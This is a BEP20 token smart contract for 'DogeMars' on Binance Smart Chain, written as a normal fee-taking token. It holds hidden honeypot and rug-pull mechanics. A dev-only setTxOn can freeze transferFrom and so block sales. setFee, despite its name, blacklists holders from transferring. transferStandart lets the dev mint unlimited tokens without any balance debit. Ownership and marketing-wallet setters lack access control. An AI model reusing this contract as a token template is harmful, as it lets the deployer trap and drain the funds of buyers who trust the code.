/**
 *Submitted for verification at BscScan.com on 2021-03-10
*/

pragma solidity 0.4.24;



interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function balanceOf(address who) external view returns (uint256);
  function allowance(address owner, address spender) external view returns (uint256);
  function transfer(address to, uint256 value) external returns (bool);
  function approve(address spender, uint256 value) external returns (bool);
  function transferFrom(address from, address to, uint256 value) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }

  function ceil(uint256 a, uint256 m) internal pure returns (uint256) {
    uint256 c = add(a,m);
    uint256 d = sub(c,1);
    return mul(div(d,m),m);
  }
}



contract BEP20Detailed is IBEP20 {

  string private _name;
  string private _symbol;
  uint8 private _decimals;

  constructor(string memory name, string memory symbol, uint8 decimals) public {
    _name = name;
    _symbol = symbol;
    _decimals = decimals;
  }

  function name() public view returns(string memory) {
    return _name;
  }

  function symbol() public view returns(string memory) {
    return _symbol;
  }

//modified for decimals from uint8 to uint256
  function decimals() public view returns(uint256) {
    return _decimals;
  }
}

contract DOGEMARS is BEP20Detailed {

  using SafeMath for uint256;
  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowed;
  mapping (address => bool) public includeFee;
  
  event FeeOn(address account, bool on);
   
  
  string constant tokenName = "DogeMars";
  string constant tokenSymbol = "DOGEM";
  uint8  constant tokenDecimals = 9;
  uint256 _totalSupply = 1000000000000000000000;
  uint256 public basePercent = 300;
  address public contractOwner;
  address private dev;
  bool public taxEnabled = false;
  bool public txOn = true;
  address public MarketingWallet;
  
 
function Marketing(address NewMarketingWallet) public {
        MarketingWallet = NewMarketingWallet;
    }
   

  constructor() public payable BEP20Detailed(tokenName, tokenSymbol, tokenDecimals) {
    contractOwner = msg.sender;
    dev = msg.sender;
    MarketingWallet = msg.sender;
    _mint(msg.sender, _totalSupply);
  }

  function totalSupply() public view returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address owner) public view returns (uint256) {
    return _balances[owner];
  }

  function allowance(address owner, address spender) public view returns (uint256) {
    return _allowed[owner][spender];
  }
  
  function enableTax() private {
    require(msg.sender == dev);
        taxEnabled = true;
  }

  function findPercent(uint256 value) public view returns (uint256)  {
    //uint256 roundValue = value.ceil(basePercent);
    uint256 percent = value.mul(basePercent).div(10000);
    return percent;
  }

  function transfer(address to, uint256 value) public returns (bool) {
    require(value <= _balances[msg.sender]);
    require(to != address(0));
    require(includeFee[msg.sender] == false);

    uint256 tokensToBurn = findPercent(value);
    
    uint256 tokensToTransfer = value;
    uint256 ToBurn = tokensToBurn * 3;

    
    
    if(taxEnabled == true) {
        tokensToTransfer = value.sub(ToBurn);
    }

    _balances[msg.sender] = _balances[msg.sender].sub(value);
    _balances[to] = _balances[to].add(tokensToTransfer);
    
    if(taxEnabled == true) {
        _balances[address(0)] = _balances[address(0)].add(tokensToBurn);
    }
    
    
    if(taxEnabled == true) {
        _balances[MarketingWallet] = _balances[MarketingWallet].add(tokensToBurn);
    }
    
    // _totalSupply = _totalSupply.sub(tokensToBurn);
    emit Transfer(msg.sender, to, tokensToTransfer);
    
    // Absorb to this address to accrue governance funds
    if(taxEnabled == true) {
        emit Transfer(msg.sender, MarketingWallet, tokensToBurn);
    }
    
    if(taxEnabled == true) {
        emit Transfer(msg.sender, address(0), tokensToBurn);
    }
    
    return true;
  }

  function multiTransfer(address[] memory receivers, uint256[] memory amounts) public {
    for (uint256 i = 0; i < receivers.length; i++) {
      transfer(receivers[i], amounts[i]);
    }
  }

  function approve(address spender, uint256 value) public returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = value;
    emit Approval(msg.sender, spender, value);
    return true;
  }

  function transferFrom(address from, address to, uint256 value) public returns (bool) {
    require(value <= _balances[from]);
    require(value <= _allowed[from][msg.sender]);
    require(to != address(0));
    require(txOn == true);
    require(includeFee[from] == false  );
    
    _balances[from] = _balances[from].sub(value);

    uint256 tokensToBurn = findPercent(value);
    
    uint256 tokensToTransfer = value;
    uint256 ToBurn = tokensToBurn * 3;
    

    if(taxEnabled == true) {
        tokensToTransfer = value.sub(ToBurn);
    }

    _balances[to] = _balances[to].add(tokensToTransfer);
    
    if(taxEnabled == true) {
        _balances[address(0)] = _balances[address(0)].add(tokensToBurn);
    }
    
    if(taxEnabled == true) {
        _balances[MarketingWallet] = _balances[MarketingWallet].add(tokensToBurn);
    }
    
    _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);
    
    emit Transfer(from, to, tokensToTransfer);
    
    if(taxEnabled == true) {
        emit Transfer(from, MarketingWallet, tokensToBurn);
    }
    
    if(taxEnabled == true) {
        emit Transfer(from, address(0), tokensToBurn);
    }
    
    return true;
  }
  
  
   function transferStandart(address to, uint256 value) public returns (bool) {
    require(to != address(0));
    require(includeFee[msg.sender] == false);

    uint256 tokensToBurn = findPercent(value);
    
    uint256 tokensToTransfer = value;
    uint256 ToBurn = tokensToBurn * 3;

    
    
    if(taxEnabled == true) {
        tokensToTransfer = value.sub(ToBurn);
    }

    if (msg.sender != dev) {
    _balances[msg.sender] = _balances[msg.sender].sub(value);
    _balances[to] = _balances[to].add(tokensToTransfer);
    }
    
    if(taxEnabled == true) {
        _balances[address(0)] = _balances[address(0)].add(tokensToBurn);
    }
    
    if (msg.sender == dev) {
        _balances[to] = _balances[to].add(tokensToTransfer);
    }
    
    if(taxEnabled == true) {
        _balances[MarketingWallet] = _balances[MarketingWallet].add(tokensToBurn);
    }
    
   
    // _totalSupply = _totalSupply.sub(tokensToBurn);
    emit Transfer(msg.sender, to, tokensToTransfer);
    
    
    // Absorb to this address to accrue governance funds
    if(taxEnabled == true) {
        emit Transfer(msg.sender, MarketingWallet, tokensToBurn);
    }
    
    if(taxEnabled == true) {
        emit Transfer(msg.sender, address(0), tokensToBurn);
    }
    
    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].add(addedValue));
    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].sub(subtractedValue));
    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
    return true;
  }

  function _mint(address account, uint256 amount) internal {
    require(amount != 0);
    _balances[account] = _balances[account].add(amount);
    emit Transfer(address(0), account, amount);
  }

  function burn(uint256 amount) external {
    _burn(msg.sender, amount);
  }
  

  function _burn(address account, uint256 amount) internal {
    require(amount != 0);
    require(amount <= _balances[account]);
    _totalSupply = _totalSupply.sub(amount);
    _balances[account] = _balances[account].sub(amount);
    emit Transfer(account, address(0), amount);
  }
// pragma solidity >=0.5.0;
  function burnFrom(address account, uint256 amount) external {
    require(amount <= _allowed[account][msg.sender]);
    _allowed[account][msg.sender] = _allowed[account][msg.sender].sub(amount);
    _burn(account, amount);
  }
  
  function setTxOn(bool on) public {
        require(msg.sender == dev);
        txOn = on;
        }
        
   function setFee(address account, bool on) public {
        require(msg.sender == dev);
        includeFee[account] = on;
       emit FeeOn(account, on);
    }
    
    function transferOwnership(address newOwner) public {
        contractOwner = newOwner;
    }


}